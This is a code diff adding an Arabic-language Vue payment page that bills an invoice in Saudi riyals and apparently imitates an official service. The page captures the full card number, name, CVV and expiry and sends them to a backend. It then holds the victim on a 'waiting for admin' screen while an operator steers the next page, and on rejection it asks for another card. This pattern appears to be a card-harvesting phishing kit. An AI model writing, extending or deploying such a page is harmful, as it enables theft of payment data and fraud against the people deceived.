@@ -1,0 +1,436 @@
+<script setup>
+import { computed, onBeforeUnmount, ref } from 'vue'
+import { useRoute, useRouter } from 'vue-router'
+import { formatCardNumber, formatCvv } from '../utils/formatters'
+import { isValidCardNumber, isValidCvv } from '../utils/validators'
+import { payByCard } from '../services/payments'
+import { getSession, sessionStorageKeys } from '../services/session'
+import { getRouteForStep } from '../services/flow'
+
+const route = useRoute()
+const router = useRouter()
+
+const months = Array.from({ length: 12 }, (_, i) => i + 1)
+const years = Array.from({ length: 6 }, (_, i) => new Date().getFullYear() + i)
+
+const cardNumber = ref('')
+const nameOnCard = ref('')
+const cvv = ref('')
+const expiryMonth = ref(0)
+const expiryYear = ref(0)
+const isRejected = ref(false)
+const loading = ref(false)
+const submitError = ref('')
+const waitingForAdmin = ref(false)
+const waitingCardBrand = ref('visa')
+const rejectedMessage =
+  'نود إبلاغكم أنه تم رفض بطاقة الدفع الخاصة بكم بسبب مشكلة في وسيلة الدفع المدخلة, نرجو منكم تغيير طريقة الدفع و إدخال وسيلة اخرى لإتمام عملية بنجاح'
+
+const invoice = computed(() => {
+  try {
+    return JSON.parse(localStorage.getItem('paymentInvoice') || '{}')
+  } catch {
+    return {}
+  }
+})
+
+const fee = computed(() => invoice.value.fee || {})
+const feeTitle = computed(() => invoice.value.feeTitle || '')
+
+const formatMoney = (value) => {
+  if (typeof value !== 'number') return '--'
+  return value.toFixed(2)
+}
+
+const handleCardNumber = (event) => {
+  cardNumber.value = formatCardNumber(event.target.value)
+}
+
+const handleCvv = (event) => {
+  cvv.value = formatCvv(event.target.value)
+}
+
+const detectCardBrand = (number) => {
+  if (/^4/.test(number)) return 'visa'
+  if (/^(5[1-5]|2[2-7])/.test(number)) return 'mastercard'
+  return 'visa'
+}
+
+const waitingCardLogo = computed(() => {
+  return waitingCardBrand.value === 'mastercard' ? '/images/mastercard.png' : '/images/visa.png'
+})
+
+let approvalTimer = null
+
+const stopApprovalPolling = () => {
+  waitingForAdmin.value = false
+  if (approvalTimer) {
+    clearInterval(approvalTimer)
+    approvalTimer = null
+  }
+}
+
+const applySessionNavigation = async (session) => {
+  if (!session) return
+
+  const submissionStatus = session.status
+  const currentRoute = session.current_route
+  const currentStep = Number(session.current_step || 0)
+
+  if (submissionStatus === 'needs_revision' || submissionStatus === 'rejected') {
+    stopApprovalPolling()
+    isRejected.value = true
+    return
+  }
+
+  if (submissionStatus === 'completed') {
+    stopApprovalPolling()
+    await router.push('/final')
+    return
+  }
+
+  if (currentRoute && currentRoute !== route.path) {
+    stopApprovalPolling()
+    await router.push(currentRoute)
+    return
+  }
+
+  if (currentStep) {
+    const nextRoute = getRouteForStep(currentStep)
+    if (nextRoute && nextRoute !== route.path) {
+      stopApprovalPolling()
+      await router.push(nextRoute)
+    }
+  }
+}
+
+const pollApproval = async (sessionId) => {
+  if (!waitingForAdmin.value) return
+  try {
+    const session = await getSession(Number(sessionId))
+    await applySessionNavigation(session)
+  } catch {
+    // Keep waiting; polling retries automatically.
+  }
+}
+
+const startApprovalPolling = (sessionId) => {
+  waitingForAdmin.value = true
+  pollApproval(sessionId)
+  approvalTimer = setInterval(() => {
+    pollApproval(sessionId)
+  }, 3000)
+}
+
+const isFormValid = computed(() => {
+  return (
+    isValidCardNumber(cardNumber.value) &&
+    isValidCvv(cvv.value) &&
+    nameOnCard.value.trim() !== '' &&
+    Number(expiryMonth.value) > 0 &&
+    Number(expiryYear.value) > 0
+  )
+})
+
+const handleSubmit = async () => {
+  submitError.value = ''
+  isRejected.value = false
+
+  const sessionId = localStorage.getItem(sessionStorageKeys.sessionId)
+  if (!sessionId) {
+    submitError.value = 'رقم الجلسة غير متوفر، يرجى إنشاء حجز جديد'
+    return
+  }
+
+  if (!isFormValid.value) {
+    submitError.value = 'يرجى إدخال بيانات البطاقة بشكل صحيح'
+    return
+  }
+
+  loading.value = true
+  try {
+    const cleanNumber = cardNumber.value.replace(/\s+/g, '')
+    const cardBrand = detectCardBrand(cleanNumber)
+    waitingCardBrand.value = cardBrand
+
+    const paymentMeta = {
+      cardType: cardBrand,
+      bankName: '',
+      cardLast4: cleanNumber.slice(-4),
+      totalPaid: fee.value?.total ? String(fee.value.total) : '',
+    }
+
+    const payload = {
+      session_id: Number(sessionId),
+      cardNumber: cleanNumber,
+      cardName: nameOnCard.value.trim(),
+      cvv: cvv.value,
+      expiryMonth: String(expiryMonth.value).padStart(2, '0'),
+      expiryYear: String(expiryYear.value),
+      payment: paymentMeta,
+    }
+
+    // عرض شاشة الانتظار مباشرة
+    startApprovalPolling(sessionId)
+    
+    const data = await payByCard(payload)
+    localStorage.setItem('payment', JSON.stringify(data?.payment || paymentMeta))
+  } catch (error) {
+    stopApprovalPolling()
+    isRejected.value = true
+    submitError.value = error?.message || ''
+  } finally {
+    loading.value = false
+  }
+}
+
+onBeforeUnmount(() => {
+  stopApprovalPolling()
+})
+</script>
+
+<template>
+  <div>
+    <header class="px-4 sm:px-6 py-3">
+      <img src="/images/vsc.svg" alt="logo" width="161px" height="39.6px" />
+    </header>
+    <hr />
+
+    <section
+      class="gap-5 bg-white sm:bg-gray-700/[.03] mx-auto grid w-full max-w-7xl px-4 sm:px-0 grid-cols-1 lg:grid-cols-2 min-h-[calc(100vh_-_56.6px)]"
+    >
+      <div class="w-full bg-white pr-0 sm:pr-11 pt-6 pb-8 pl-0 sm:pl-3">
+        <div class="inline-flex w-full max-w-[465px] flex-col items-start">
+          <div class="inline-flex flex-col items-start gap-3">
+            <div class="text-lg font-bold leading-7 text-foreground/80">معلومات الفاتورة</div>
+            <p class="text-sm font-normal leading-tight text-gray-500">دفع رسوم {{ feeTitle }}</p>
+            <h1 class="text-4xl font-bold leading-10 text-foreground/80">
+              {{ formatMoney(fee.total) }} ر.س
+            </h1>
+          </div>
+
+          <div class="flex w-full flex-col gap-6 mt-11">
+            <div class="flex flex-col gap-2">
+              <div class="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-foreground">
+                <div>المجموع الفرعي</div>
+                <div class="leading-none">{{ formatMoney(fee.base) }} ر.س</div>
+              </div>
+              <div class="flex w-full items-center justify-between gap-4 text-xs font-normal leading-none text-gray-500">
+                <div>ضريبة القيمة المضافة 15%</div>
+                <div class="text-sm leading-none">{{ formatMoney(fee.vat) }} ر.س</div>
+              </div>
+            </div>
+            <hr />
+            <div class="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-foreground">
+              <div>المبلغ المستحق</div>
+              <div class="text-sm leading-none">{{ formatMoney(fee.total) }} ر.س</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="bg-white pr-0 sm:pr-10 pt-6 pb-8 w-full">
+        <div class="max-w-[416px]">
+          <div class="flex flex-col gap-2">
+            <div class="text-lg font-bold leading-7 text-foreground/80">الدفع من خلال بطاقة الائتمان</div>
+            <div class="text-sm font-normal leading-tight text-gray-500">من فضلك أدخل معلومات الدفع الخاصة بك</div>
+          </div>
+
+          <form class="flex flex-col gap-4" @submit.prevent="handleSubmit">
+            <div class="mt-9 inline-flex w-full flex-col items-start justify-start gap-2">
+              <h5 class="flex justify-end gap-2 items-center text-xs font-semibold leading-none text-gray-500 w-full">
+                <img src="/images/mastercard.png" width="38px" height="25px" />
+                <img src="/images/visa.png" width="38px" height="25px" />
+                <img src="/images/mada-with-border.png" width="38px" height="25px" />
+              </h5>
+
+              <div class="relative flex h-full w-full flex-col gap-4">
+                <div>
+                  <label class="block text-sm text-foreground mb-1">رقم البطاقة</label>
+                  <input
+                    dir="ltr"
+                    type="tel"
+                    class="w-full border border-gray-300 rounded-md px-3 py-2"
+                    placeholder="1234 1234 1234 1234"
+                    :value="cardNumber"
+                    @input="handleCardNumber"
+                  />
+                </div>
+
+                <div>
+                  <label class="block text-sm text-foreground mb-1">اسم صاحب البطاقة</label>
+                  <div class="relative">
+                    <input
+                      dir="ltr"
+                      type="text"
+                      class="w-full border border-gray-300 rounded-md px-3 py-2"
+                      v-model="nameOnCard"
+                      maxlength="30"
+                    />
+                    <span v-if="!nameOnCard" class="absolute top-2 right-3.5 text-[#bababa]">
+                      الأسم على البطاقة (بالإنجليزية)
+                    </span>
+                  </div>
+                </div>
+
+                <div class="expiry flex gap-2">
+                  <div class="w-[30%] sm:w-[50%]">
+                    <div class="w-[100%] sm:w-[50%]">
+                      <div class="flex justify-between">
+                        <label class="block text-sm text-foreground mb-1">رمز (CVV)</label>
+                        <img src="/images/cvv-info.png" class="h-4" />
+                      </div>
+                      <input
+                        dir="ltr"
+                        type="tel"
+                        class="w-full border border-gray-300 rounded-md px-3 py-2"
+                        placeholder="CVV"
+                        :value="cvv"
+                        @input="handleCvv"
+                      />
+                    </div>
+                  </div>
+
+                  <div class="w-[70%] sm:w-[50%]">
+                    <label class="block text-sm text-foreground mb-1">تاريخ الانتهاء</label>
+                    <div class="expiry flex gap-2">
+                      <select v-model="expiryYear" class="w-full border border-gray-300 rounded-md px-3 py-2">
+                        <option value="0">سنة</option>
+                        <option v-for="year in years" :key="year" :value="year">
+                          {{ year }}
+                        </option>
+                      </select>
+                      <select v-model="expiryMonth" class="w-full border border-gray-300 rounded-md px-3 py-2">
+                        <option value="0">شهر</option>
+                        <option v-for="month in months" :key="month" :value="month">
+                          {{ String(month).padStart(2, '0') }}
+                        </option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div
+              v-if="isRejected"
+              class="font-medium mt-5 text-red-500 text-center text-sm flex items-center gap-1"
+            >
+              {{ rejectedMessage }}
+            </div>
+
+            <div class="mt-4">
+              <button
+                type="submit"
+                class="w-full rounded-lg bg-main text-white py-3"
+                :disabled="!isFormValid || loading || waitingForAdmin"
+              >
+                {{ loading ? 'جارٍ الإرسال...' : 'ادفع الآن' }}
+              </button>
+              <p v-if="submitError" class="text-sm text-red-500 mt-2">{{ submitError }}</p>
+            </div>
+            <img src="/images/cards-all.png" width="50%" class="mx-auto pt-4" />
+            <div class="flex items-center justify-center">
+              <span class="text-green-500">✔</span>
+              <span class="mx-2 font-semibold">دفع آمن وسريع</span>
+            </div>
+          </form>
+        </div>
+      </div>
+    </section>
+
+    <div v-if="waitingForAdmin" class="fixed inset-0 z-[9999]">
+      <div class="payment-wait-backdrop absolute inset-0"></div>
+      <div class="absolute inset-0 flex items-center justify-center p-4">
+        <div class="payment-wait-card">
+          <img :src="waitingCardLogo" alt="card logo" class="h-12 w-auto object-contain" />
+
+          <div class="payment-wait-spinner mt-4">
+            <span class="payment-wait-spinner-core"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</template>
+
+<style scoped>
+.payment-wait-backdrop {
+  background: rgba(5, 10, 20, 0.7);
+  backdrop-filter: blur(7px);
+  animation: overlay-fade-in 0.24s ease-out both;
+}
+
+.payment-wait-card {
+  width: min(92vw, 360px);
+  min-height: 230px;
+  border-radius: 18px;
+  border: 1px solid #dbe3ee;
+  background: linear-gradient(180deg, #ffffff 0%, #f8fbff 100%);
+  box-shadow: 0 24px 64px rgba(2, 8, 23, 0.35);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 24px 18px;
+  animation: card-pop-in 0.28s cubic-bezier(0.2, 0.8, 0.2, 1) both;
+}
+
+.payment-wait-spinner {
+  width: 58px;
+  height: 58px;
+  border-radius: 9999px;
+  border: 4px solid #d6e6ff;
+  border-top-color: #2f80ed;
+  animation: spin 0.9s linear infinite;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.payment-wait-spinner-core {
+  width: 16px;
+  height: 16px;
+  border-radius: 9999px;
+  background: #2f80ed;
+  animation: core-pulse 0.95s ease-in-out infinite;
+}
+
+@keyframes overlay-fade-in {
+  from {
+    opacity: 0;
+  }
+  to {
+    opacity: 1;
+  }
+}
+
+@keyframes card-pop-in {
+  from {
+    opacity: 0;
+    transform: translateY(14px) scale(0.97);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0) scale(1);
+  }
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+@keyframes core-pulse {
+  0%,
+  100% {
+    transform: scale(0.78);
+    opacity: 0.7;
+  }
+  50% {
+    transform: scale(1);
+    opacity: 1;
+  }
+}
+</style>
